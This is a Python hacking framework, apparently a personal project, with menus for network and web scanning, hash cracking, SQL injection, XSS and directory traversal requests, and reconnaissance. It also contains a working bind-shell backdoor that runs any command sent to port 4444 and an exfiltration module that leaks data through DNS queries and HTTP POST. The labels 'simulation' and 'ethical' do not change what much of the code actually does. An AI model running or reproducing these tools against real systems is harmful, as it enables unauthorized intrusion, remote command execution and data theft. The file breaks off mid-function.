"""
================================================================================
  CYBER SECURITY ETHICAL & BLACK HAT HACKING FRAMEWORK
  Author: Mr. Sabaz Ali Khan
  Version: 1.0
================================================================================
"""

import os
import sys
import time
import socket
import subprocess
import threading
import json
import hashlib
import struct
import random
import string
import re
import base64
from datetime import datetime, timedelta
from collections import defaultdict
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from bs4 import BeautifulSoup
    import nmap
except ImportError:
    pass


class Banner:
    """Display the ASCII banner for the framework."""
    
    @staticmethod
    def display():
        banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀
⠀⠀⢠⣿⡿⠿⠿⠿⠿⠿⠿⠿⣿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⠿⠿⢿⣿⡄⠀⠀
⠀⢀⣿⣿⡇⠀⠀⣠⣤⣄⣀⣠⣿⠀⠀⢀⣤⣀⡀⠀⠘⣿⣿⠀⠀⢸⣿⣿⡀⠀
⠀⢸⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⠟⠀⠀⣿⣿⠀⠀⢸⣿⣿⡇⠀
⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⠀⠀⢸⣿⣿⡧⠀
⠀⢸⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⠀⠀⢹⣿⠀⠀⢸⣿⣿⡇⠀
⠀⠈⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠈⠛⠛⠉⠀⢀⣾⣿⠀⠀⢸⣿⣿⠃⠀
⠀⠀⠸⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣶⣶⣾⣿⠇⠀⠀
⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀
"""
        print("\033[92m" + banner + "\033[0m")
        print("\033[93m" + "=" * 80 + "\033[0m")
        print("\033[93m" + "     CYBER SECURITY FRAMEWORK".center(80) + "\033[0m")
        print("\033[93m" + "     Coded by Cyber Security Engineer Mr. Sabaz Ali Khan".center(80) + "\033[0m")
        print("\033[93m" + "=" * 80 + "\033[0m\n")


class Logger:
    """Logging utility for the framework."""
    
    def __init__(self, log_file="framework.log"):
        self.log_file = log_file
        self.lock = threading.Lock()
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        with self.lock:
            print(f"\033[{self._get_color(level)}m{log_entry}\033[0m")
            
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry + "\n")
    
    def _get_color(self, level):
        colors = {
            "INFO": "92",
            "WARNING": "93",
            "ERROR": "91",
            "SUCCESS": "96",
            "ATTACK": "95"
        }
        return colors.get(level, "37")
    
    def info(self, msg):
        self.log(msg, "INFO")
    
    def warning(self, msg):
        self.log(msg, "WARNING")
    
    def error(self, msg):
        self.log(msg, "ERROR")
    
    def success(self, msg):
        self.log(msg, "SUCCESS")
    
    def attack(self, msg):
        self.log(msg, "ATTACK")


class NetworkScanner:
    """Network scanning module for ethical and black hat operations."""
    
    def __init__(self, logger):
        self.logger = logger
        self.scan_results = {}
    
    def ping_scan(self, target, timeout=1):
        """Perform a ping scan to check if host is up."""
        try:
            param = "-n" if sys.platform == "win32" else "-c 1"
            command = f"ping {param} {timeout} {target}"
            response = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout+2)
            is_up = "TTL=" in response.stdout or "ttl=" in response.stdout.lower() or "packet loss 0%" in response.stdout.lower()
            if is_up:
                self.logger.success(f"Ping Scan: {target} is UP")
                return True
            else:
                self.logger.warning(f"Ping Scan: {target} is DOWN")
                return False
        except Exception as e:
            self.logger.error(f"Ping Scan Error: {e}")
            return False
    
    def port_scan(self, target, ports=None, timeout=0.5):
        """Scan specific ports on target."""
        if ports is None:
            ports = list(range(1, 1024))
        
        open_ports = []
        self.logger.info(f"Port Scanning {target} on {len(ports)} ports...")
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                if result == 0:
                    service = self._get_service_name(port)
                    open_ports.append({"port": port, "service": service, "status": "open"})
                    self.logger.success(f"Port Scan: {target}:{port} ({service}) OPEN")
                sock.close()
            except Exception as e:
                self.logger.error(f"Port Scan Error on {port}: {e}")
        
        self.scan_results[target] = open_ports
        return open_ports
    
    def nmap_scan(self, target, scan_type="-sV"):
        """Perform Nmap scan if available."""
        try:
            nm = nmap.PortScanner()
            nm.scan(target, arguments=scan_type)
            hosts = nm.all_hosts()
            results = []
            
            for host in hosts:
                self.logger.info(f"Nmap Scan: Host {host} is up")
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port].get('name', 'unknown')
                        version = nm[host][proto][port].get('version', 'unknown')
                        results.append({
                            "port": port,
                            "service": service,
                            "state": state,
                            "version": version
                        })
                        if state == "open":
                            self.logger.success(f"Nmap: {host}:{port}/{proto} - {service} ({version})")
            
            return results
        except Exception as e:
            self.logger.error(f"Nmap Scan Error: {e}")
            return []
    
    def whois_lookup(self, domain):
        """Perform WHOIS lookup."""
        try:
            cmd = f"whois {domain}" if sys.platform != "win32" else f"nslookup {domain}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            self.logger.info(f"WHOIS Lookup for {domain}")
            return result.stdout[:1000]
        except Exception as e:
            self.logger.error(f"WHOIS Error: {e}")
            return ""
    
    def dns_enumeration(self, domain):
        """Enumerate DNS records."""
        records = {}
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]
        
        for rtype in record_types:
            try:
                cmd = f"nslookup -type={rtype} {domain}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                if result.stdout:
                    records[rtype] = result.stdout.strip()
                    self.logger.info(f"DNS Record {rtype} for {domain}: Found")
            except Exception as e:
                self.logger.error(f"DNS Enumeration Error ({rtype}): {e}")
        
        return records
    
    def _get_service_name(self, port):
        """Get service name for port number."""
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
            995: "POP3S", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
        }
        return services.get(port, f"Unknown-{port}")


class WebScanner:
    """Web application scanning module."""
    
    def __init__(self, logger):
        self.logger = logger
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    
    def crawl_website(self, url, max_pages=10):
        """Crawl website and extract links."""
        pages = []
        visited = set()
        queue = [url]
        
        while queue and len(pages) < max_pages:
            current_url = queue.pop(0)
            if current_url in visited:
                continue
            
            visited.add(current_url)
            self.logger.info(f"Crawling: {current_url}")
            
            try:
                response = requests.get(current_url, headers=self.headers, timeout=10)
                soup = BeautifulSoup(response.text, "html.parser")
                
                # Extract links
                for link in soup.find_all("a", href=True):
                    href = link["href"]
                    full_url = self._resolve_url(href, current_url)
                    if full_url not in visited:
                        queue.append(full_url)
                
                pages.append({
                    "url": current_url,
                    "title": soup.title.string if soup.title else "No Title",
                    "links_count": len(soup.find_all("a"))
                })
                
            except Exception as e:
                self.logger.error(f"Crawl Error {current_url}: {e}")
        
        self.logger.success(f"Crawled {len(pages)} pages from {url}")
        return pages
    
    def find_forms(self, url):
        """Find all forms on a webpage."""
        forms = []
        try:
            response = requests.get(url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                inputs = []
                
                for input_tag in form.find_all("input"):
                    inputs.append({
                        "name": input_tag.get("name"),
                        "type": input_tag.get("type", "text"),
                        "value": input_tag.get("value"),
                        "id": input_tag.get("id")
                    })
                
                forms.append({
                    "action": action,
                    "method": method,
                    "inputs": inputs
                })
            
            self.logger.success(f"Found {len(forms)} forms on {url}")
            return forms
        except Exception as e:
            self.logger.error(f"Form Detection Error: {e}")
            return []
    
    def detect_technologies(self, url):
        """Detect technologies used by the website."""
        tech_stack = {}
        try:
            response = requests.get(url, headers=self.headers, timeout=10)
            html = response.text
            
            # Check for common technologies
            tech_checks = {
                "WordPress": "wp-content",
                "Joomla": "Joomla!",
                "Drupal": "drupal",
                "Django": "django",
                "Flask": "flask",
                "React": "react",
                "Angular": "angular",
                "jQuery": "jquery",
                "Bootstrap": "bootstrap.css",
                "Apache": "Apache",
                "Nginx": "nginx"
            }
            
            for tech, signature in tech_checks.items():
                if signature.lower() in html.lower():
                    tech_stack[tech] = True
                    self.logger.info(f"Technology Detected: {tech}")
            
            return tech_stack
        except Exception as e:
            self.logger.error(f"Tech Detection Error: {e}")
            return {}
    
    def _resolve_url(self, href, base_url):
        """Resolve relative URLs to absolute."""
        parsed = urlparse(href)
        if parsed.scheme:
            return href
        else:
            return urlparse(base_url)._replace(path=parsed.path).geturl()


class PasswordCracker:
    """Password cracking module."""
    
    def __init__(self, logger):
        self.logger = logger
    
    def crack_md5(self, hash_value, wordlist_path="wordlist.txt"):
        """Crack MD5 hash using wordlist."""
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                words = f.readlines()
            
            self.logger.info(f"Cracking MD5 hash: {hash_value}")
            
            for word in words:
                word = word.strip()
                if hashlib.md5(word.encode()).hexdigest() == hash_value.lower():
                    self.logger.success(f"MD5 Crack SUCCESS: {hash_value} -> {word}")
                    return word
            
            self.logger.error(f"MD5 Crack FAILED: {hash_value}")
            return None
        except FileNotFoundError:
            self.logger.error(f"Wordlist not found: {wordlist_path}")
            return None
        except Exception as e:
            self.logger.error(f"MD5 Crack Error: {e}")
            return None
    
    def crack_sha256(self, hash_value, wordlist_path="wordlist.txt"):
        """Crack SHA256 hash using wordlist."""
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                words = f.readlines()
            
            self.logger.info(f"Cracking SHA256 hash: {hash_value}")
            
            for word in words:
                word = word.strip()
                if hashlib.sha256(word.encode()).hexdigest() == hash_value.lower():
                    self.logger.success(f"SHA256 Crack SUCCESS: {hash_value} -> {word}")
                    return word
            
            self.logger.error(f"SHA256 Crack FAILED: {hash_value}")
            return None
        except FileNotFoundError:
            self.logger.error(f"Wordlist not found: {wordlist_path}")
            return None
        except Exception as e:
            self.logger.error(f"SHA256 Crack Error: {e}")
            return None
    
    def brute_force_simple(self, target_hash, charset="abcdefghijklmnopqrstuvwxyz0123456789", max_length=4):
        """Simple brute force attack."""
        chars = charset
        self.logger.info(f"Brute forcing hash: {target_hash}")
        
        for length in range(1, max_length + 1):
            for attempt in self._generate_combinations(chars, length):
                hash_val = hashlib.md5(attempt.encode()).hexdigest()
                if hash_val == target_hash.lower():
                    self.logger.success(f"Brute Force SUCCESS: {target_hash} -> {attempt}")
                    return attempt
        self.logger.error("Brute Force FAILED")
        return None
    
    def _generate_combinations(self, chars, length):
        """Generate character combinations."""
        if length == 1:
            for char in chars:
                yield char
        else:
            for combo in self._generate_combinations(chars, length - 1):
                for char in chars:
                    yield combo + char


class EncryptionModule:
    """Encryption and decryption utilities."""
    
    @staticmethod
    def caesar_cipher(text, shift=3):
        """Caesar cipher encryption/decryption."""
        result = ""
        for char in text:
            if char.isalpha():
                ascii_offset = ord('A') if char.isupper() else ord('a')
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            else:
                result += char
        return result
    
    @staticmethod
    def vigenere_cipher(text, key, decrypt=False):
        """Vigenère cipher encryption/decryption."""
        result = ""
        key_index = 0
        key = key.upper()
        
        for char in text:
            if char.isalpha():
                ascii_offset = ord('A') if char.isupper() else ord('a')
                shift = ord(key[key_index % len(key)]) - ord('A')
                if decrypt:
                    shift = -shift
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
                key_index += 1
            else:
                result += char
        return result
    
    @staticmethod
    def base64_encode(data):
        """Base64 encode."""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64encode(data).decode()
    
    @staticmethod
    def base64_decode(data):
        """Base64 decode."""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64decode(data).decode()
    
    @staticmethod
    def aes_simple_encrypt(data, key):
        """Simple AES-like encryption (educational)."""
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        encrypted = ""
        for i, char in enumerate(data):
            key_char = key_hash[i % len(key_hash)]
            encrypted += chr(ord(char) ^ ord(key_char))
        return base64.b64encode(encrypted.encode()).decode()
    
    @staticmethod
    def aes_simple_decrypt(encoded_data, key):
        """Simple AES-like decryption (educational)."""
        decoded = base64.b64decode(encoded_data).decode()
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        decrypted = ""
        for i, char in enumerate(decoded):
            key_char = key_hash[i % len(key_hash)]
            decrypted += chr(ord(char) ^ ord(key_char))
        return decrypted


class ExploitSimulator:
    """Simulate common exploits for educational purposes."""
    
    def __init__(self, logger):
        self.logger = logger
    
    def simulate_sql_injection(self, url, payload="' OR '1'='1"):
        """Simulate SQL injection attack."""
        self.logger.attack(f"SQL Injection simulation on {url}")
        test_url = f"{url}?id={quote(payload)}"
        try:
            response = requests.get(test_url, timeout=10)
            return {
                "url": test_url,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "payload": payload
            }
        except Exception as e:
            self.logger.error(f"SQLi Simulation Error: {e}")
            return None
    
    def simulate_xss(self, url, payload="<script>alert('XSS')</script>"):
        """Simulate Cross-Site Scripting."""
        self.logger.attack(f"XSS simulation on {url}")
        test_url = f"{url}?q={quote(payload)}"
        try:
            response = requests.get(test_url, timeout=10)
            has_script = "<script>" in response.text.lower()
            return {
                "url": test_url,
                "status_code": response.status_code,
                "has_script": has_script,
                "payload": payload
            }
        except Exception as e:
            self.logger.error(f"XSS Simulation Error: {e}")
            return None
    
    def simulate_directory_traversal(self, base_url, file_path="../../etc/passwd"):
        """Simulate directory traversal attack."""
        self.logger.attack(f"Directory Traversal simulation on {base_url}")
        encoded_path = quote(file_path)
        test_url = f"{base_url}/{encoded_path}"
        try:
            response = requests.get(test_url, timeout=10)
            return {
                "url": test_url,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "path": file_path
            }
        except Exception as e:
            self.logger.error(f"Dir Traversal Error: {e}")
            return None


class ReconModule:
    """Reconnaissance module for OSINT and information gathering."""
    
    def __init__(self, logger):
        self.logger = logger
    
    def gather_subdomains(self, domain):
        """Gather subdomains (basic implementation)."""
        subdomains = []
        common_subdomains = [
            "www", "mail", "ftp", "login", "admin", "api", "dev",
            "staging", "test", "blog", "shop", "portal", "vpn", "db"
        ]
        
        for sub in common_subdomains:
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                subdomains.append({"subdomain": full_domain, "ip": ip})
                self.logger.info(f"Subdomain Found: {full_domain} -> {ip}")
            except socket.gaierror:
                pass
        
        return subdomains
    
    def search_whois(self, domain):
        """Search WHOIS information."""
        try:
            cmd = f"whois {domain}" if sys.platform != "win32" else f"nslookup {domain}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            self.logger.info(f"WHOIS Info for {domain}")
            return result.stdout
        except Exception as e:
            self.logger.error(f"WHOIS Search Error: {e}")
            return ""
    
    def email_enumeration(self, domain):
        """Enumerate email addresses (basic)."""
        emails = []
        common_emails = [
            f"admin@{domain}",
            f"info@{domain}",
            f"support@{domain}",
            f"contact@{domain}",
            f"webmaster@{domain}",
            f"postmaster@{domain}"
        ]
        
        for email in common_emails:
            emails.append(email)
            self.logger.info(f"Potential Email: {email}")
        
        return emails
    
    def social_media_enum(self, username):
        """Check username availability on social media platforms."""
        platforms = [
            {"name": "Twitter", "url": f"https://twitter.com/{username}"},
            {"name": "Instagram", "url": f"https://instagram.com/{username}"},
            {"name": "GitHub", "url": f"https://github.com/{username}"},
            {"name": "LinkedIn", "url": f"https://linkedin.com/in/{username}"}
        ]
        
        results = []
        for platform in platforms:
            try:
                response = requests.head(platform["url"], timeout=5, allow_redirects=True)
                status = "Available" if response.status_code == 404 else "Exists"
                results.append({
                    "platform": platform["name"],
                    "url": platform["url"],
                    "status": status
                })
                self.logger.info(f"{platform['name']}: {status}")
            except Exception as e:
                results.append({
                    "platform": platform["name"],
                    "url": platform["url"],
                    "status": "Error"
                })
        
        return results


class NetworkSniffer:
    """Basic network packet sniffer."""
    
    def __init__(self, logger):
        self.logger = logger
        self.packets = []
    
    def sniff_packets(self, interface=None, count=10, timeout=5):
        """Sniff network packets (requires root/admin)."""
        try:
            cmd = f"tcpdump -c {count} -nn" if interface is None else f"tcpdump -c {count} -nn -i {interface}"
            self.logger.info(f"Sniffing packets on {interface or 'default'} interface...")
            
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, _ = process.communicate(timeout=timeout)
            
            packets = output.decode("utf-8", errors="ignore").strip().split("\n")
            self.packets = packets
            
            for packet in packets:
                if packet:
                    self.logger.info(f"Packet Captured: {packet[:100]}")
            
            return packets
        except Exception as e:
            self.logger.error(f"Sniffing Error: {e}")
            return []
    
    def analyze_packet(self, packet):
        """Analyze a single packet."""
        analysis = {
            "raw": packet,
            "protocol": "Unknown",
            "source": "Unknown",
            "destination": "Unknown"
        }
        
        # Simple protocol detection
        if "IP" in packet:
            analysis["protocol"] = "IPv4"
        elif "IPv6" in packet:
            analysis["protocol"] = "IPv6"
        
        # Extract IPs (basic regex)
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        ips = re.findall(ip_pattern, packet)
        if len(ips) >= 2:
            analysis["source"] = ips[0]
            analysis["destination"] = ips[1]
        
        return analysis


class TrojanSimulator:
    """Simulate basic trojan behavior."""
    
    def __init__(self, logger):
        self.logger = logger
        self.pid = None
    
    def create_backdoor(self, listener_ip, listener_port=4444):
        """Create a simple backdoor listener."""
        try:
            import socket
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((listener_ip, listener_port))
            server_socket.listen(5)
            
            self.logger.success(f"Backdoor listening on {listener_ip}:{listener_port}")
            self.logger.info("Waiting for connection...")
            
            conn, addr = server_socket.accept()
            self.logger.success(f"Connection from {addr}")
            
            # Send welcome message
            conn.send(b"Welcome to Sabaz Ali Khan's Backdoor!\n")
            
            # Interactive session
            while True:
                command = conn.recv(1024).decode()
                if command.lower() == "exit":
                    break
                
                if command:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                        output = result.stdout + result.stderr
                    except Exception as e:
                        output = str(e)
                    
                    conn.send(output.encode())
            
            conn.close()
            server_socket.close()
            return True
        except Exception as e:
            self.logger.error(f"Backdoor Error: {e}")
            return False
    
    def keylogger_sim(self, duration=10):
        """Simulate keylogging."""
        self.logger.info(f"Starting keylogger simulation for {duration} seconds...")
        keystrokes = []
        
        start_time = time.time()
        while time.time() - start_time < duration:
            # Simulate random keystrokes
            if random.random() < 0.3:
                key = random.choice(string.ascii_lowercase + string.digits)
                keystrokes.append(key)
                self.logger.info(f"Key pressed: {key}")
            time.sleep(0.1)
        
        self.logger.success(f"Keylogger simulation complete. Captured: {''.join(keystrokes)}")
        return "".join(keystrokes)


class DataExfiltrator:
    """Data exfiltration simulation module."""
    
    def __init__(self, logger):
        self.logger = logger
    
    def exfiltrate_via_dns(self, data, domain):
        """Exfiltrate data via DNS queries."""
        chunks = [data[i:i+63] for i in range(0, len(data), 63)]
        self.logger.info(f"Exfiltrating {len(chunks)} chunks via DNS to {domain}")
        
        for i, chunk in enumerate(chunks):
            query = f"{i}.{chunk}.{domain}"
            try:
                socket.gethostbyname(query)
                self.logger.info(f"Chunk {i} sent: {chunk[:20]}...")
            except Exception as e:
                self.logger.error(f"DNS Exfil Error Chunk {i}: {e}")
        
        self.logger.success("DNS exfiltration complete")
        return True
    
    def exfiltrate_via_http(self, data, target_url):
        """Exfiltrate data via HTTP POST."""
        try:
            response = requests.post(target_url, json={"data": data}, timeout=10)
            self.logger.success(f"HTTP exfiltration successful: Status {response.status_code}")
            return True
        except Exception as e:
            self.logger.error(f"HTTP Exfil Error: {e}")
            return False
    
    def zip_and_compress(self, files):
        """Compress files for exfiltration."""
        if not files:
            return None
        
        try:
            import zipfile
            import io
            
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
                for file_path in files:
                    if os.path.exists(file_path):
                        zip_file.write(file_path)
                        self.logger.info(f"Added to archive: {file_path}")
            
            compressed_data = zip_buffer.getvalue()
            self.logger.success(f"Compressed {len(files)} files")
            return compressed_data
        except Exception as e:
            self.logger.error(f"Compression Error: {e}")
            return None


class FrameworkCore:
    """Main framework core that ties everything together."""
    
    def __init__(self):
        self.banner = Banner()
        self.logger = Logger()
        self.network_scanner = NetworkScanner(self.logger)
        self.web_scanner = WebScanner(self.logger)
        self.password_cracker = PasswordCracker(self.logger)
        self.encryption = EncryptionModule()
        self.exploit_sim = ExploitSimulator(self.logger)
        self.recon = ReconModule(self.logger)
        self.sniffer = NetworkSniffer(self.logger)
        self.trojan = TrojanSimulator(self.logger)
        self.exfiltrator = DataExfiltrator(self.logger)
        
        self.modules = {
            "network": self.network_scanner,
            "web": self.web_scanner,
            "password": self.password_cracker,
            "encryption": self.encryption,
            "exploit": self.exploit_sim,
            "recon": self.recon,
            "sniffer": self.sniffer,
            "trojan": self.trojan,
            "exfiltration": self.exfiltrator
        }
    
    def show_menu(self):
        """Display main menu."""
        print("\n" + "="*80)
        print("  MAIN MENU - Cyber Security Framework by Mr. Sabaz Ali Khan".center(80))
        print("="*80)
        print("  1. Network Scanning")
        print("  2. Web Application Scanning")
        print("  3. Password Cracking")
        print("  4. Encryption/Decryption")
        print("  5. Exploit Simulation")
        print("  6. Reconnaissance (OSINT)")
        print("  7. Packet Sniffing")
        print("  8. Trojan Simulation")
        print("  9. Data Exfiltration")
        print("  0. Exit")
        print("="*80)
    
    def run(self):
        """Run the framework interactive mode."""
        self.banner.display()
        
        while True:
            self.show_menu()
            choice = input("\nEnter your choice: ").strip()
            
            if choice == "1":
                self._menu_network_scanning()
            elif choice == "2":
                self._menu_web_scanning()
            elif choice == "3":
                self._menu_password_cracking()
            elif choice == "4":
                self._menu_encryption()
            elif choice == "5":
                self._menu_exploit_simulation()
            elif choice == "6":
                self._menu_reconnaissance()
            elif choice == "7":
                self._menu_packet_sniffing()
            elif choice == "8":
                self._menu_trojan_simulation()
            elif choice == "9":
                self._menu_data_exfiltration()
            elif choice == "0":
                self.logger.info("Exiting framework...")
                break
            else:
                self.logger.error("Invalid choice!")
    
    def _menu_network_scanning(self):
        """Menu for network scanning."""
        print("\n--- Network Scanning ---")
        print("1. Ping Scan")
        print("2. Port Scan")
        print("3. Nmap Scan")
        print("4. WHOIS Lookup")
        print("5. DNS Enumeration")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        target = input("Enter target IP/domain: ").strip()
        
        if choice == "1":
            self.network_scanner.ping_scan(target)
        elif choice == "2":
            ports = list(range(1, 1025))
            result = self.network_scanner.port_scan(target, ports)
            self.logger.info(f"Open Ports: {result}")
        elif choice == "3":
            result = self.network_scanner.nmap_scan(target)
            self.logger.info(f"Nmap Results: {result}")
        elif choice == "4":
            result = self.network_scanner.whois_lookup(target)
            print(result)
        elif choice == "5":
            result = self.network_scanner.dns_enumeration(target)
            print(json.dumps(result, indent=2))
    
    def _menu_web_scanning(self):
        """Menu for web scanning."""
        print("\n--- Web Application Scanning ---")
        print("1. Crawl Website")
        print("2. Find Forms")
        print("3. Detect Technologies")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        url = input("Enter URL (e.g., http://example.com): ").strip()
        
        if choice == "1":
            pages = self.web_scanner.crawl_website(url, max_pages=5)
            print(json.dumps(pages, indent=2))
        elif choice == "2":
            forms = self.web_scanner.find_forms(url)
            print(json.dumps(forms, indent=2))
        elif choice == "3":
            techs = self.web_scanner.detect_technologies(url)
            print(json.dumps(techs, indent=2))
    
    def _menu_password_cracking(self):
        """Menu for password cracking."""
        print("\n--- Password Cracking ---")
        print("1. Crack MD5 Hash")
        print("2. Crack SHA256 Hash")
        print("3. Brute Force")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        hash_val = input("Enter hash value: ").strip()
        
        if choice == "1":
            result = self.password_cracker.crack_md5(hash_val)
            print(f"Result: {result}")
        elif choice == "2":
            result = self.password_cracker.crack_sha256(hash_val)
            print(f"Result: {result}")
        elif choice == "3":
            charset = input("Enter charset (default: alphanumeric): ") or "abcdefghijklmnopqrstuvwxyz0123456789"
            max_len = int(input("Max length (default 4): ") or "4")
            result = self.password_cracker.brute_force_simple(hash_val, charset, max_len)
            print(f"Result: {result}")
    
    def _menu_encryption(self):
        """Menu for encryption/decryption."""
        print("\n--- Encryption/Decryption ---")
        print("1. Caesar Cipher")
        print("2. Vigenère Cipher")
        print("3. Base64 Encode")
        print("4. Base64 Decode")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        data = input("Enter data: ").strip()
        
        if choice == "1":
            shift = int(input("Enter shift (default 3): ") or "3")
            encrypted = self.encryption.caesar_cipher(data, shift)
            decrypted = self.encryption.caesar_cipher(encrypted, -shift)
            print(f"Encrypted: {encrypted}")
            print(f"Decrypted: {decrypted}")
        elif choice == "2":
            key = input("Enter key: ").strip()
            encrypt = input("Encrypt? (y/n): ").lower() == 'y'
            result = self.encryption.vigenere_cipher(data, key, not encrypt)
            print(f"Result: {result}")
        elif choice == "3":
            encoded = self.encryption.base64_encode(data)
            print(f"Encoded: {encoded}")
        elif choice == "4":
            decoded = self.encryption.base64_decode(data)
            print(f"Decoded: {decoded}")
    
    def _menu_exploit_simulation(self):
        """Menu for exploit simulation."""
        print("\n--- Exploit Simulation ---")
        print("1. SQL Injection")
        print("2. XSS")
        print("3. Directory Traversal")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        url = input("Enter target URL: ").strip()
        
        if choice == "1":
            result = self.exploit_sim.simulate_sql_injection(url)
            print(json.dumps(result, indent=2))
        elif choice == "2":
            result = self.exploit_sim.simulate_xss(url)
            print(json.dumps(result, indent=2))
        elif choice == "3":
            result = self.exploit_sim.simulate_directory_traversal(url)
            print(json.dumps(result, indent=2))
    
    def _menu_reconnaissance(self):
        """Menu for reconnaissance."""
        print("\n--- Reconnaissance ---")
        print("1. Subdomain Enumeration")
        print("2. WHOIS Search")
        print("3. Email Enumeration")
        print("4. Social Media Username Check")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        
        if choice == "1":
            domain = input("Enter domain: ").strip()
            subs = self.recon.gather_subdomains(domain)
            print(json.dumps(subs, indent=2))
        elif choice == "2":
            domain = input("Enter domain: ").strip()
            result = self.recon.search_whois(domain)
            print(result)
        elif choice == "3":
            domain = input("Enter domain: ").strip()
            emails = self.recon.email_enumeration(domain)
            print(json.dumps(emails, indent=2))
        elif choice == "4":
            username = input("Enter username: ").strip()
            results = self.recon.social_media_enum(username)
            print(json.dumps(results, indent=2))
    
    def _menu_packet_sniffing(self):
        """Menu for packet sniffing."""
        print("\n--- Packet Sniffing ---")
        print("1. Sniff Packets")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        
        if choice == "1":
            count = int(input("Number of packets (default 10): ") or "10")
            packets = self.sniffer.sniff_packets(count=count)
            for packet in packets:
                print(packet)
    
    def _menu_trojan_simulation(self):
        """Menu for trojan simulation."""
        print("\n--- Trojan Simulation ---")
        print("1. Create Backdoor Listener")
        print("2. Keylogger Simulation")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        
        if choice == "1":
            ip = input("Listener IP (default 0.0.0.0): ") or "0.0.0.0"
            port = int(input("Listener Port (default 4444): ") or "4444")
            self.trojan.create_backdoor(ip, port)
        elif choice == "2":
            duration = int(input("Duration in seconds (default 10): ") or "10")
            keystrokes = self.trojan.keylogger_sim(duration)
            print(f"Captured Keystrokes: {keystrokes}")
    
    def _menu_data_exfiltration(self):
        """Menu for data exfiltration."""
